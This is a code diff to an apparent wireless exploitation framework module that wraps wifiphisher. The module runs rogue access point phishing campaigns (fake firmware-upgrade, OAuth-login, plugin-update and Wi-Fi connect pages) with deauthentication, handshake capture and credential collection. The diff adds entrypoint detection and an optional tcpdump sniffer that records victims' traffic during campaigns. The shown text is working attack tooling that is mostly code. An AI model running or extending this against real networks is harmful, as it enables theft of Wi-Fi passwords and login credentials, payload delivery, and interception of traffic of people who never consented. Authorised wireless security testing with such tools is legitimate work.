@@ -20,7 +20,11 @@ Supported phishing scenarios (built-in wifiphisher templates):
   - plugin_update       Browser plugin update (payload delivery)
   - wifi_connect        Network Manager imitation (PSK capture)
 
-Version: 1.0.0
+Improvements from upstream wifiphisher:
+  - PR #1673: modernized launcher/layout compatibility (entrypoint detection)
+  - PR #1560: optional inline packet sniffer during campaigns
+
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -30,8 +34,9 @@ import logging
 import os
 import shutil
 import subprocess
+import time
 from pathlib import Path
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
 
 from wirelessxpl.core.exploit import *
 
@@ -79,32 +84,46 @@ class Exploit(Exploit):
     channel = OptString("", "Channel for rogue AP (auto if blank)")
     handshake_capture = OptBool(True, "Also capture WPA handshake during deauth")
     credentials_dir = OptString("", "Directory to save captured credentials (default: .log/)")
+    sniffer_enabled = OptBool(False, "Enable inline packet sniffer (tcpdump) while wifiphisher runs")
+    sniffer_interface = OptString("", "Interface for sniffer (default: deauth_interface or interface)")
+    sniffer_bpf = OptString("", "Optional tcpdump BPF filter")
+    sniffer_output = OptString("", "PCAP output path (default: .log/wifiphisher_capture_<ts>.pcap)")
     dry_run = OptBool(False, "Print command without executing")
 
     KNOWN_SCENARIOS = ("firmware-upgrade", "oauth-login", "plugin_update", "wifi_connect")
     KNOWN_EXTENSIONS = ("deauth", "knownbeacons", "lure10", "wpspbc")
 
-    def _find_wifiphisher(self) -> Optional[str]:
-        """Locate wifiphisher binary or Python entry point."""
+    def _find_wifiphisher(self) -> Optional[Tuple[str, bool]]:
+        """Locate wifiphisher entrypoint and whether python wrapper is needed."""
         binary = shutil.which("wifiphisher")
         if binary:
-            return binary
+            return binary, False
 
-        submodule_entry = Path(__file__).resolve().parents[5] / "submodules" / "IoT" / "wifiphisher" / "bin" / "wifiphisher"
-        if submodule_entry.exists():
-            return str(submodule_entry)
+        root = Path(__file__).resolve().parents[5]
+        candidates = (
+            root / "submodules" / "IoT" / "wifiphisher" / "bin" / "wifiphisher",  # legacy
+            root / "submodules" / "IoT" / "wifiphisher" / "wifiphisher.py",  # flat script
+            root / "submodules" / "IoT" / "wifiphisher" / "wifiphisher" / "__main__.py",  # package entry
+        )
+        for entry in candidates:
+            if entry.exists():
+                if entry.suffix == ".py":
+                    return str(entry), True
+                return str(entry), False
 
         return None
 
     def _build_command(self) -> List[str]:
         """Build the wifiphisher command line from current options."""
-        wfp = self._find_wifiphisher()
+        found = self._find_wifiphisher()
+        wfp = found[0] if found else ""
+        needs_python = found[1] if found else False
         if not wfp:
             raise FileNotFoundError(
                 "wifiphisher not found. Install it or ensure submodules/IoT/wifiphisher is cloned."
             )
 
-        cmd = ["sudo", "python3", wfp] if not wfp.endswith(".py") else ["sudo", wfp]
+        cmd = ["sudo", "python3", wfp] if needs_python else ["sudo", wfp]
 
         if self.target:
             cmd.extend(["-e", self.target])
@@ -136,6 +155,35 @@ class Exploit(Exploit):
 
         return cmd
 
+    def _build_sniffer_command(self, log_dir: Path) -> Optional[List[str]]:
+        """Build optional tcpdump sniffer command for live capture."""
+        if not self.sniffer_enabled:
+            return None
+
+        tcpdump_bin = shutil.which("tcpdump")
+        if not tcpdump_bin:
+            logger.warning("sniffer_enabled=True but tcpdump not found in PATH")
+            return None
+
+        capture_iface = (
+            str(self.sniffer_interface).strip()
+            or str(self.deauth_interface).strip()
+            or str(self.interface).strip()
+        )
+        if not capture_iface:
+            logger.warning("sniffer_enabled=True but no capture interface was provided")
+            return None
+
+        output_path = str(self.sniffer_output).strip()
+        if not output_path:
+            output_path = str(log_dir / "wifiphisher_capture_{}.pcap".format(int(time.time())))
+
+        cmd = ["sudo", tcpdump_bin, "-i", capture_iface, "-U", "-n", "-w", output_path]
+        bpf = str(self.sniffer_bpf).strip()
+        if bpf:
+            cmd.extend(bpf.split())
+        return cmd
+
     def run(self) -> None:
         """Execute wifiphisher as subprocess."""
         try:
@@ -159,8 +207,19 @@ class Exploit(Exploit):
 
         log_dir = Path(self.credentials_dir) if self.credentials_dir else Path(".log")
         log_dir.mkdir(parents=True, exist_ok=True)
+        sniffer_cmd = self._build_sniffer_command(log_dir)
+        sniffer_proc = None
+        if sniffer_cmd:
+            print_info("Inline sniffer enabled: {}".format(" ".join(sniffer_cmd)))
 
         try:
+            if sniffer_cmd:
+                sniffer_proc = subprocess.Popen(
+                    sniffer_cmd,
+                    cwd=str(log_dir),
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
             result = subprocess.run(
                 cmd,
                 cwd=str(log_dir),
@@ -175,6 +234,13 @@ class Exploit(Exploit):
             print_info("\nWifiphisher interrupted by user.")
         except Exception as err:
             print_error("Failed to run wifiphisher: {}".format(err))
+        finally:
+            if sniffer_proc and sniffer_proc.poll() is None:
+                sniffer_proc.terminate()
+                try:
+                    sniffer_proc.wait(timeout=2)
+                except Exception:
+                    sniffer_proc.kill()
 
         self._collect_credentials(log_dir)
 
